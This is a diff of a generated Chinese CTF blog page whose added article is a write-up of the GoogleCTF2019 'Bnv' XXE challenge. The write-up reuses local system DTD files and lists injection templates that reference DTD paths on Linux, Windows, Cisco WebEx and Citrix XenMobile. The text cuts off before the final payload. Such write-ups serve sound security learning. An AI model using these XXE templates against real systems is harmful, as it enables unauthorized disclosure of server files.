@@ -2,34 +2,34 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>MIXBP</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="MIXBP">
+  <title>GoogleCTF2019Quals-Bnv | MIXBP</title>
+  <meta name="keywords" content=" xxe , 本地dtd文件引入 ">
+  <meta name="description" content="GoogleCTF2019Quals-Bnv | MIXBP">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="PASECA2019-honey_shop参考博客：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_46263951&#x2F;article&#x2F;details&#x2F;119703207 首先打开网页，发现是一个购物系统。且这种题一般都需要我们去买flag。  经典钱不够。  这种题一般都和session有关，需要我们去伪造session。抓个包看看。  1eyJiYWxhbmNlIjoxMzM2LCJwdXJj">
+<meta name="description" content="HXCTF-WEB玩玩你的机-1这题需要nc连接服务才能看到题目，可以直接在linux上用nc，我这里是在windows下用的netcat工具 netcat常用参数 12345678910-l 开启监听    -p 指定端口    -t 以telnet形式应答    -e 程序重定向    -n 以数字形式标识IP    -v 显示执行命令过程   -z 不进行交互，直接显示结果   -u 使用U">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PASECA2019-honey_shop">
-<meta property="og:url" content="https://mixbp.github.io/master/2025/05/19/PASECA2019-honey-shop/index.html">
+<meta property="og:title" content="HXCTF复现">
+<meta property="og:url" content="https://mixbp.github.io/master/2025/05/20/HXCTF%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="MIXBP">
-<meta property="og:description" content="PASECA2019-honey_shop参考博客：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_46263951&#x2F;article&#x2F;details&#x2F;119703207 首先打开网页，发现是一个购物系统。且这种题一般都需要我们去买flag。  经典钱不够。  这种题一般都和session有关，需要我们去伪造session。抓个包看看。  1eyJiYWxhbmNlIjoxMzM2LCJwdXJj">
+<meta property="og:description" content="HXCTF-WEB玩玩你的机-1这题需要nc连接服务才能看到题目，可以直接在linux上用nc，我这里是在windows下用的netcat工具 netcat常用参数 12345678910-l 开启监听    -p 指定端口    -t 以telnet形式应答    -e 程序重定向    -n 以数字形式标识IP    -v 显示执行命令过程   -z 不进行交互，直接显示结果   -u 使用U">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://mixbp.github.io/image/PASECA2019-honey_shop-1.png">
-<meta property="og:image" content="https://mixbp.github.io/image/PASECA2019-honey_shop-2.png">
-<meta property="og:image" content="https://mixbp.github.io/image/PASECA2019-honey_shop-3.png">
-<meta property="og:image" content="https://mixbp.github.io/image/PASECA2019-honey_shop-4.png">
-<meta property="og:image" content="https://mixbp.github.io/image/PASECA2019-honey_shop-5.png">
-<meta property="og:image" content="https://mixbp.github.io/image/PASECA2019-honey_shop-6.png">
-<meta property="og:image" content="https://mixbp.github.io/image/PASECA2019-honey_shop-7.png">
-<meta property="og:image" content="https://mixbp.github.io/image/PASECA2019-honey_shop-8.png">
-<meta property="article:published_time" content="2025-05-19T10:49:26.000Z">
-<meta property="article:modified_time" content="2025-05-19T11:18:49.967Z">
+<meta property="og:image" content="https://mixbp.github.io/image/HXCTF%E5%A4%8D%E7%8E%B0-1.png">
+<meta property="og:image" content="https://mixbp.github.io/image/HXCTF%E5%A4%8D%E7%8E%B0-2.png">
+<meta property="og:image" content="https://mixbp.github.io/image/HXCTF%E5%A4%8D%E7%8E%B0-3.png">
+<meta property="og:image" content="https://mixbp.github.io/image/HXCTF%E5%A4%8D%E7%8E%B0-4.png">
+<meta property="og:image" content="https://mixbp.github.io/image/HXCTF%E5%A4%8D%E7%8E%B0-5.png">
+<meta property="article:published_time" content="2025-05-20T12:14:41.000Z">
+<meta property="article:modified_time" content="2025-05-20T13:23:35.570Z">
 <meta property="article:author" content="MIXBP">
-<meta property="article:tag" content="jwt解密">
-<meta property="article:tag" content="session伪造">
-<meta property="article:tag" content="文件下载漏洞">
-<meta property="article:tag" content="Python环境变量">
+<meta property="article:tag" content="nc连接服务">
+<meta property="article:tag" content="netcat">
+<meta property="article:tag" content="沙箱逃逸">
+<meta property="article:tag" content="python命令执行">
+<meta property="article:tag" content="python代码审计">
+<meta property="article:tag" content="无回显ssti模版注入">
+<meta property="article:tag" content="ssti响应头回显">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://mixbp.github.io/image/PASECA2019-honey_shop-1.png">
+<meta name="twitter:image" content="https://mixbp.github.io/image/HXCTF%E5%A4%8D%E7%8E%B0-1.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -67,7 +67,7 @@
 
 
 <body>
-<aside class="nav mobile">
+<aside class="nav">
     <div class="nav-left">
         <a href="/"
    class="avatar_target">
@@ -128,7 +128,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(128)</small>
+                <small>(138)</small>
             
         </div>
     </li>
@@ -140,7 +140,7 @@
         <div data-rel="学习笔记">
             
             学习笔记
-            <small>(16)</small>
+            <small>(23)</small>
         </div>
         
     </li>
@@ -155,7 +155,7 @@
         <div data-rel="刷题笔记">
             
             刷题笔记
-            <small>(13)</small>
+            <small>(20)</small>
         </div>
         
     </li>
@@ -208,8 +208,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="128">
-<input type="hidden" id="yelog_site_word_count" value="230.7k">
+<input type="hidden" id="yelog_site_posts_number" value="138">
+<input type="hidden" id="yelog_site_word_count" value="239.4k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -303,6 +303,14 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>爆破</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>本地dtd文件引入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>比赛复现</a>
             </li>
         
@@ -335,7 +343,19 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>多文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>二次编码绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>二次注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>反弹shell</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -348,6 +368,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>反引号执行命令</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>关键字过滤</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -423,6 +447,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>沙箱逃逸</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>十六进制编码</a>
             </li>
         
@@ -443,7 +471,15 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>双大括号过滤</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>特殊变量名传参</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>提权</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -483,6 +519,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>无回显ssti模版注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>无列名盲注</a>
             </li>
         
@@ -516,6 +556,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>压缩文件修复</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>异或布尔盲注</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -683,6 +727,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>filter伪协议变种</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>finfo_file</a>
             </li>
         
@@ -763,6 +811,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>json</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>json绕过</a>
             </li>
         
@@ -816,6 +868,14 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>MySQL</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>nc连接服务</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>netcat</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -907,6 +967,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>pickle反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>pickle反序列化漏洞</a>
             </li>
         
@@ -936,6 +1000,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>python脚本编写</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>python命令执行</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -1043,6 +1111,14 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssti外带数据</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssti响应头回显</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>steghide隐写</a>
             </li>
         
@@ -1063,7 +1139,19 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>thinkphp upload类错误使用导致getshell</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>thinkphp v6.0任意文件操作漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>thinkphp路由默认上传路径</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>token获取</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -1096,6 +1184,22 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>webshell</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xpath基础</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xpath盲注</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xpath语法</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xpath注入</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -1136,6 +1240,96 @@
     </div>
     
     <nav id="title-list-nav">
+        
+        
+        <a  class="All "
+           href="/2025/05/20/HXCTF%E5%A4%8D%E7%8E%B0/"
+           data-tag="nc连接服务,netcat,沙箱逃逸,python命令执行,python代码审计,无回显ssti模版注入,ssti响应头回显"
+           data-author="" >
+            <span class="post-title" title="HXCTF复现">HXCTF复现</span>
+            <span class="post-date" title="2025-05-20 20:14:41">2025/05/20</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/05/20/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-include00/"
+           data-tag="php伪协议,filter伪协议变种,二次编码绕过"
+           data-author="" >
+            <span class="post-title" title="NewStarCTF2023公开赛道-include00">NewStarCTF2023公开赛道-include00</span>
+            <span class="post-date" title="2025-05-20 18:37:34">2025/05/20</span>
+        </a>
+        
+        
+        <a  class="All 刷题笔记 "
+           href="/2025/05/20/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Easyphp2/"
+           data-tag="文件包含,getshell,php代码审计,php伪协议,二次编码绕过,提权"
+           data-author="" >
+            <span class="post-title" title="羊城杯2020-Easyphp2">羊城杯2020-Easyphp2</span>
+            <span class="post-date" title="2025-05-20 17:39:03">2025/05/20</span>
+        </a>
+        
+        
+        <a  class="All 刷题笔记 "
+           href="/2025/05/20/watevrCTF-2019-PickleStore/"
+           data-tag="python反序列化,外带数据,pickle反序列化,反弹shell"
+           data-author="" >
+            <span class="post-title" title="watevrCTF-2019-PickleStore">watevrCTF-2019-PickleStore</span>
+            <span class="post-date" title="2025-05-20 16:38:08">2025/05/20</span>
+        </a>
+        
+        
+        <a  class="All 刷题笔记 "
+           href="/2025/05/20/RoarCTF2019-SimpleUpload/"
+           data-tag="thinkphp路由默认上传路径,thinkphp upload类错误使用导致getshell,多文件上传,爆破"
+           data-author="" >
+            <span class="post-title" title="RoarCTF2019-SimpleUpload">RoarCTF2019-SimpleUpload</span>
+            <span class="post-date" title="2025-05-20 12:40:18">2025/05/20</span>
+        </a>
+        
+        
+        <a  class="All 刷题笔记 "
+           href="/2025/05/20/GWCTF2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/"
+           data-tag="ssti,双大括号过滤,关键字过滤,ssti外带数据"
+           data-author="" >
+            <span class="post-title" title="GWCTF2019-你的名字">GWCTF2019-你的名字</span>
+            <span class="post-date" title="2025-05-20 12:17:43">2025/05/20</span>
+        </a>
+        
+        
+        <a  class="All 学习笔记 "
+           href="/2025/05/19/xpath%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/"
+           data-tag="xpath语法,xpath注入"
+           data-author="" >
+            <span class="post-title" title="xpath注入基础">xpath注入基础</span>
+            <span class="post-date" title="2025-05-19 21:22:38">2025/05/19</span>
+        </a>
+        
+        
+        <a  class="All 刷题笔记 "
+           href="/2025/05/19/NPUCTF2020-ezlogin/"
+           data-tag="xpath基础,xpath盲注,token获取"
+           data-author="" >
+            <span class="post-title" title="NPUCTF2020-ezlogin">NPUCTF2020-ezlogin</span>
+            <span class="post-date" title="2025-05-19 20:21:40">2025/05/19</span>
+        </a>
+        
+        
+        <a  class="All 刷题笔记 "
+           href="/2025/05/19/GoogleCTF2019Quals-Bnv/"
+           data-tag="xxe,本地dtd文件引入"
+           data-author="" >
+            <span class="post-title" title="GoogleCTF2019Quals-Bnv">GoogleCTF2019Quals-Bnv</span>
+            <span class="post-date" title="2025-05-19 20:05:07">2025/05/19</span>
+        </a>
+        
+        
+        <a  class="All 刷题笔记 "
+           href="/2025/05/19/BlackWatch%E5%85%A5%E7%BE%A4%E9%A2%98-Web/"
+           data-tag="sql注入,异或布尔盲注,json"
+           data-author="" >
+            <span class="post-title" title="BlackWatch入群题-Web">BlackWatch入群题-Web</span>
+            <span class="post-date" title="2025-05-19 19:28:10">2025/05/19</span>
+        </a>
         
         
         <a  class="All 刷题笔记 "
@@ -1239,7 +1433,7 @@
         
         <a  class="All 刷题笔记 "
            href="/2025/04/29/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"
-           data-tag="文件上传,sql注入,反序列化,insert闭合,十六进制编码"
+           data-tag="sql注入,文件上传,反序列化,insert闭合,十六进制编码"
            data-author="" >
             <span class="post-title" title="安洵杯2019-不是文件上传">安洵杯2019-不是文件上传</span>
             <span class="post-date" title="2025-04-29 20:59:59">2025/04/29</span>
@@ -1482,7 +1676,7 @@
         
         <a  class="All 比赛复现 "
            href="/2025/04/15/TGCTF-2025%E5%A4%8D%E7%8E%B0/"
-           data-tag="upload,sql注入,时间盲注,RCE,CVE,目录穿越,内存马,明文攻击,压缩文件修复,时间帧隐写,docker"
+           data-tag="sql注入,upload,时间盲注,RCE,CVE,目录穿越,内存马,明文攻击,压缩文件修复,时间帧隐写,docker"
            data-author="" >
             <span class="post-title" title="TGCTF-2025复现">TGCTF-2025复现</span>
             <span class="post-date" title="2025-04-15 14:10:07">2025/04/15</span>
@@ -1698,7 +1892,7 @@
         
         <a  class="All "
            href="/2025/03/30/SUCTF2019-Pythonginx/"
-           data-tag="idna编码特性,python代码审计,nginx"
+           data-tag="python代码审计,idna编码特性,nginx"
            data-author="" >
             <span class="post-title" title="SUCTF2019-Pythonginx">SUCTF2019-Pythonginx</span>
             <span class="post-date" title="2025-03-30 20:21:20">2025/03/30</span>
@@ -1734,7 +1928,7 @@
         
         <a  class="All "
            href="/2025/03/29/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-FinalSQL/"
-           data-tag="刷题笔记,sql盲注,sql注入,异或盲注"
+           data-tag="刷题笔记,sql注入,sql盲注,异或盲注"
            data-author="" >
             <span class="post-title" title="极客大挑战2019-FinalSQL">极客大挑战2019-FinalSQL</span>
             <span class="post-date" title="2025-03-29 18:32:48">2025/03/29</span>
@@ -1833,7 +2027,7 @@
         
         <a  class="All "
            href="/2025/03/27/only-one-sql/"
-           data-tag="刷题笔记,sql盲注,sql注入"
+           data-tag="刷题笔记,sql注入,sql盲注"
            data-author="" >
             <span class="post-title" title="only-one-sql">only-one-sql</span>
             <span class="post-date" title="2025-03-27 21:04:25">2025/03/27</span>
@@ -1941,7 +2135,7 @@
         
         <a  class="All "
            href="/2025/03/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook1/"
-           data-tag="刷题笔记,php反序列化,sql注入,ssrf"
+           data-tag="刷题笔记,sql注入,php反序列化,ssrf"
            data-author="" >
             <span class="post-title" title="网鼎杯2018Fakebook1">网鼎杯2018Fakebook1</span>
             <span class="post-date" title="2025-03-20 23:53:35">2025/03/20</span>
@@ -2083,18 +2277,18 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 学习笔记 "
            href="/2025/02/23/ctfshow-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"
-           data-tag="信息搜集,学习笔记"
+           data-tag="信息搜集"
            data-author="" >
             <span class="post-title" title="ctfshow-信息搜集">ctfshow-信息搜集</span>
             <span class="post-date" title="2025-02-23 15:24:36">2025/02/23</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 学习笔记 "
            href="/2025/02/17/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
-           data-tag="命令执行,学习笔记"
+           data-tag="命令执行"
            data-author="" >
             <span class="post-title" title="ctfshow-命令执行">ctfshow-命令执行</span>
             <span class="post-date" title="2025-02-17 00:00:48">2025/02/17</span>
@@ -2110,27 +2304,27 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 学习笔记 "
            href="/2025/02/12/xss%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
-           data-tag="学习笔记,xss漏洞"
+           data-tag="xss漏洞"
            data-author="" >
             <span class="post-title" title="xss漏洞总结">xss漏洞总结</span>
             <span class="post-date" title="2025-02-12 03:30:15">2025/02/12</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 学习笔记 "
            href="/2025/02/11/xss-labs/"
-           data-tag="学习笔记,xss漏洞"
+           data-tag="xss漏洞"
            data-author="" >
             <span class="post-title" title="xss-labs">xss-labs</span>
             <span class="post-date" title="2025-02-11 23:43:19">2025/02/11</span>
         </a>
         
         
-        <a  class="All "
+        <a  class="All 学习笔记 "
            href="/2025/02/01/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"
-           data-tag="学习笔记,linux"
+           data-tag="linux"
            data-author="" >
             <span class="post-title" title="linux基础命令">linux基础命令</span>
             <span class="post-date" title="2025-02-01 22:14:44">2025/02/01</span>
@@ -2182,9 +2376,9 @@
         </a>
         
         
-        <a  class="All "
+        <a  class="All 学习笔记 "
            href="/2025/01/22/upload/"
-           data-tag="文件上传,学习笔记"
+           data-tag="文件上传"
            data-author="" >
             <span class="post-title" title="upload">upload</span>
             <span class="post-date" title="2025-01-22 15:22:47">2025/01/22</span>
@@ -2299,18 +2493,79 @@
 
     </div>
     <div class="hide-list">
-        <div class="semicircle" data-title="切换全屏 快捷键 s">
+        <div class="semicircle" data-title="Toggle full screen shortcut key s">
             <div class="brackets first"><</div>
             <div class="brackets">&gt;</div>
         </div>
     </div>
 </aside>
-<div id="post" class="index">
+<div id="post">
     <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+        <article id="post-GoogleCTF2019Quals-Bnv" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E5%8D%9A%E5%AE%A2%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-text">对博客的理解</span></a></li></ol>
+        <h1 class="article-title">GoogleCTF2019Quals-Bnv</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="刷题笔记">刷题笔记</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color4">xxe</a>
+            
+            <a class="color5">本地dtd文件引入</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2025-05-20 12:49:57'>2025-05-19 20:05</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:468</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="Jump to comment area">
+            <a href="#comments">
+                Comment:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#GoogleCTF2019Quals-Bnv"><span class="toc-text">GoogleCTF2019Quals-Bnv</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E7%9A%84DTD%E6%96%87%E4%BB%B6"><span class="toc-text">本地的DTD文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E5%88%B6Linux%E7%B3%BB%E7%BB%9F"><span class="toc-text">定制Linux系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89Windows%E7%B3%BB%E7%BB%9F"><span class="toc-text">自定义Windows系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E7%A7%91%E7%BD%91%E8%AE%AF"><span class="toc-text">思科网讯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Citrix-XenMobile%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">Citrix XenMobile服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E4%BD%95Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%9C%A8IBM-WebSphere-Application-Server"><span class="toc-text">任何Web应用程序在IBM WebSphere Application Server</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -2323,11 +2578,44 @@
     }
 </style>
 </div>
-            <h2 id="对博客的理解"><a href="#对博客的理解" class="headerlink" title="对博客的理解"></a>对博客的理解</h2><p><strong>欢迎来到我博客，啥也没有随便看看吧</strong></p>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="GoogleCTF2019Quals-Bnv"><a href="#GoogleCTF2019Quals-Bnv" class="headerlink" title="GoogleCTF2019Quals-Bnv"></a>GoogleCTF2019Quals-Bnv</h1><p>参考博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_49656607/article/details/126388372">https://blog.csdn.net/weixin_49656607/article/details/126388372</a></p>
+<p>首先打开页面。</p>
+<p><img src="/../image/GoogleCTF2019Quals-Bnv-1.png"></p>
+<p>先抓个包看看。发现传参json格式数据， 可以尝试xxe，先将content-type改为application&#x2F;xml，然后再把json格式的数据改为xml格式的数据。</p>
+<p><img src="/../image/GoogleCTF2019Quals-Bnv-2.png"></p>
+<p>但是发现基本的xxe和远程无回显的xxe都不行。</p>
+<p>然后查wp发现，这里目标不能加载外部dtd，所以普通的xxe不行，但是可以利用linux本身的dtd。</p>
+<hr>
+<h2 id="本地的DTD文件"><a href="#本地的DTD文件" class="headerlink" title="本地的DTD文件"></a>本地的DTD文件</h2><p><a target="_blank" rel="noopener" href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">—————利用XXE与本地DTD文件—————-</a></p>
+<h3 id="定制Linux系统"><a href="#定制Linux系统" class="headerlink" title="定制Linux系统"></a>定制Linux系统</h3><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">ISOamsa</span> <span class="hljs-string">&#x27; </span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml"></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">Your DTD code</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml"></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml"> &#x27;</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-perl"><span class="hljs-variable">%local_dtd</span>;</span><br></code></pre></td></tr></table></figure>
 
-        </article>
-        
-        
+<h3 id="自定义Windows系统"><a href="#自定义Windows系统" class="headerlink" title="自定义Windows系统"></a>自定义Windows系统</h3><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:\Windows\System32\wbem\xml\cim20.dtd&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">SuperClass</span> <span class="hljs-string">&#x27;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml"></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">Your DTD code</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml"></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">&lt;!ENTITY test &quot;test&quot;&#x27;</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-perl"><span class="hljs-variable">%local_dtd</span>;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="思科网讯"><a href="#思科网讯" class="headerlink" title="思科网讯"></a>思科网讯</h3><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">url</span>.attribute.set <span class="hljs-string">&#x27;&gt; </span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml"></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">Your DTD code </span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml"></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">&lt;!ENTITY test &quot;test&quot;&#x27;</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-perl"><span class="hljs-variable">%local_dtd</span>;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Citrix-XenMobile服务器"><a href="#Citrix-XenMobile服务器" class="headerlink" title="Citrix XenMobile服务器"></a>Citrix XenMobile服务器</h3><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">local_dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;jar:file:///opt/sas/sw/tomcat/shared/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">Body</span> <span class="hljs-string">&#x27;&gt;</span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml"></span></span></span><br><span class="hljs-string"><span class="hljs-meta"><span class="language-xml">Your DTD 